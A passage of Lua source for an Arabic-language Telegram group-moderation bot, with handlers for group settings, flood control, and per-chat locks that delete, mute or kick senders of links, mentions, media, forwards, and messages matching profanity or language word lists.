tdcli_function ({ID = "ChangeChatPhoto",chat_id_ = msg.chat_id_,photo_ = getInputFile(photo_id) }, function(arg,data)   
if data.code_ == 3 then
send(msg.chat_id_, msg.id_,'✯︙عذرآ البوت ليس ادمن بالقناه ')
database:del(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) 
return false  end
if data.message_ == "CHAT_ADMIN_REQUIRED" then 
send(msg.chat_id_, msg.id_,'✯︙… عذرآ البوت لايملك صلاحيات')
database:del(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) 
else
send(msg.chat_id_, msg.id_,'✯︙تم تغيير صورة الكروب')
end
end, nil) 
database:del(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) 
end   
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if database:get(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_," ✯︙تم الغاء وضع الوصف")
database:del(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)
return false  
end 
database:del(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
https.request('https://api.telegram.org/bot'..token..'/setChatDescription?chat_id='..msg.chat_id_..'&description='..text) 
send(msg.chat_id_, msg.id_,'✯︙تم تغيير وصف الكروب')
return false  
end 
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if database:get(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_," ✯︙تم الغاء حفظ الترحيب")
database:del(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
database:del(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
database:set(bot_id..'Get:Welcome:Group'..msg.chat_id_,text) 
send(msg.chat_id_, msg.id_,'✯︙تم حفظ ترحيب الكروب')
return false   
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if database:get(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) then
if text == 'الغاء' then
send(msg.chat_id_,msg.id_," ✯︙تم الغاء حفظ الرابط")
database:del(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) 
return false
end
if text and text:match("(https://telegram.me/joinchat/%S+)") or text and text:match("(https://t.me/joinchat/%S+)") then     
local Link = text:match("(https://telegram.me/joinchat/%S+)") or text and text:match("(https://t.me/joinchat/%S+)")   
database:set(bot_id.."Private:Group:Link"..msg.chat_id_,Link)
send(msg.chat_id_,msg.id_," ✯︙تم حفظ الرابط بنجاح")
database:del(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) 
return false 
end
end 
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if WaTaN_Msg and not Special(msg) then  
local WaTaN_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if WaTaN_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ✯︙العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n✯︙["..WaTaN_Msg.."] \n")
else
send(msg.chat_id_,0," ✯︙العضو : {["..data.first_name_.."](t.me/WaTaNTeaM)}\n✯︙["..WaTaN_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if not Special(msg) and msg.content_.ID ~= "MessageChatAddMembers" and database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") then 
floods = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") or 'nil'
NUM_MSG_MAX = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") or 5
TIME_CHECK = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") or 5
local post_count = tonumber(database:get(bot_id..'floodc:'..msg.sender_user_id_..':'..msg.chat_id_) or 0)
if post_count > tonumber(database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") or 5) then 
local ch = msg.chat_id_
local type = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") 
trigger_anti_spam(msg,type)  
end
database:setex(bot_id..'floodc:'..msg.sender_user_id_..':'..msg.chat_id_, tonumber(database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") or 3), post_count+1) 
local edit_id = data.text_ or 'nil'  
NUM_MSG_MAX = 5
if database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") then
NUM_MSG_MAX = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") 
end
if database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") then
TIME_CHECK = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") 
end 
end 
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and database:get(bot_id..'lock:Fshar'..msg.chat_id_) and not Special(msg) then 
list = {"كس","كسمك","كسختك","عير","كسخالتك","خرا بالله","عير بالله","كسخواتكم","كحاب","مناويج","مناويج","كحبه","ابن الكحبه","فرخ","فروخ","طيزك","طيزختك"}
for k,v in pairs(list) do
print(string.find(text,v))
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if text and database:get(bot_id..'lock:Fars'..msg.chat_id_) and not Special(msg) then 
list = {"ڄ","گ","که","پی","خسته","برم","راحتی","بیام","بپوشم","گرمه","چه","چ","ڬ","ٺ","چ","ڇ","ڿ","ڀ","ڎ","ݫ","ژ","ڟ","ݜ","ڸ","پ","۴","زدن","دخترا","دیوث","مک","زدن", "خالی بند","عزیزم خوبی","سلامت باشی","میخوام","خوببی","ميدم","کی اومدی","خوابیدین"}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if text and database:get(bot_id..'lock:asiaoi'..msg.chat_id_) and not Special(msg) then 
list = {"鯿","闦","闪","鰳","輏","軰","輄輍","竦","㈣㊣","穙轪"}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if text and database:get(bot_id..'lock:Engilsh'..msg.chat_id_) and not Special(msg) then 
list = {'a','u','y','l','t','b','A','Q','U','J','K','L','B','D','L','V','Z','k','n','c','r','q','o','z','I','j','m','M','w','d','h','e'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if database:get(bot_id..'lock:text'..msg.chat_id_) and not Special(msg) then       
DeleteMessage(msg.chat_id_,{[0] = msg.id_})   
return false     
end     
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.content_.ID == "MessageChatAddMembers" then 
database:incr(bot_id..'Add:Contact'..msg.chat_id_..':'..msg.sender_user_id_) 
end
if msg.content_.ID == "MessageChatAddMembers" and not Special(msg) then   
if database:get(bot_id.."lock:AddMempar"..msg.chat_id_) == 'kick' then
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
chat_kick(msg.chat_id_,mem_id[i].id_)
end
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.content_.ID == "MessageChatJoinByLink" and not Special(msg) then 
if database:get(bot_id.."lock:Join"..msg.chat_id_) == 'kick' then
chat_kick(msg.chat_id_,msg.sender_user_id_)
return false  
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.content_.caption_ then 
if msg.content_.caption_:match("@[%a%d_]+") or msg.content_.caption_:match("@(.+)") then  
if database:get(bot_id.."lock:user:name"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and text:match("@[%a%d_]+") or text and text:match("@(.+)") then    
if database:get(bot_id.."lock:user:name"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.content_.caption_ then 
if msg.content_.caption_:match("#[%a%d_]+") or msg.content_.caption_:match("#(.+)") then 
if database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and text:match("#[%a%d_]+") or text and text:match("#(.+)") then
if database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.content_.caption_ then 
if msg.content_.caption_:match("/[%a%d_]+") or msg.content_.caption_:match("/(.+)") then  
if database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and text:match("/[%a%d_]+") or text and text:match("/(.+)") then
if database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.content_.caption_ then 
if not Special(msg) then 
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or msg.content_.caption_:match(".[Pp][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or msg.content_.caption_:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/") or msg.content_.caption_:match("[Tt].[Mm][Ee]/") then 
if database:get(bot_id.."lock:Link"..msg.chat_id_) == "del" and not Special(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "ked" and not Special(msg) then
ked(msg.chat_id_,msg.sender_user_id_)
database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "kick" and not Special(msg) then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "ktm" and not Special(msg) then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or text and text:match("[Hh][Tt][Tt][Pp][Ss]://") or text and text:match("[Hh][Tt][Tt][Pp]://") or text and text:match("[Ww][Ww][Ww].") or text and text:match(".[Cc][Oo][Mm]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or text and text:match(".[Pp][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or text and text:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/") or text and text:match("[Tt].[Mm][Ee]/") and not Special(msg) then
if database:get(bot_id.."lock:Link"..msg.chat_id_) == "del" and not Special(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "ked" and not Special(msg) then 
ked(msg.chat_id_,msg.sender_user_id_)
database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "kick" and not Special(msg) then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "ktm" and not Special(msg) then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.content_.ID == 'MessagePhoto' and not Special(msg) then     
if database:get(bot_id.."lock:Photo"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.content_.ID == 'MessageVideo' and not Special(msg) then     
if database:get(bot_id.."lock:Video"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.content_.ID == 'MessageAnimation' and not Special(msg) then     
if database:get(bot_id.."lock:Animation"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.content_.game_ and not Special(msg) then     
if database:get(bot_id.."lock:geam"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.content_.ID == 'MessageAudio' and not Special(msg) then     
if database:get(bot_id.."lock:Audio"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Audio"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Audio"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Audio"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.content_.ID == 'MessageVoice' and not Special(msg) then     
if database:get(bot_id.."lock:vico"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.reply_markup_ and msg.reply_markup_.ID == 'ReplyMarkupInlineKeyboard' and not Special(msg) then     
if database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.content_.ID == 'MessageSticker' and not Special(msg) then     
if database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
if tonumber(msg.via_bot_user_id_) ~= 0 and not Special(msg) then
if database:get(bot_id.."lock:inline"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:inline"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:inline"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:inline"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.forward_info_ and not Special(msg) then     
if database:get(bot_id.."lock:forward"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.content_.ID == 'MessageDocument' and not Special(msg) then     
if database:get(bot_id.."lock:Document"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.content_.ID == "MessageUnsupported" and not Special(msg) then      
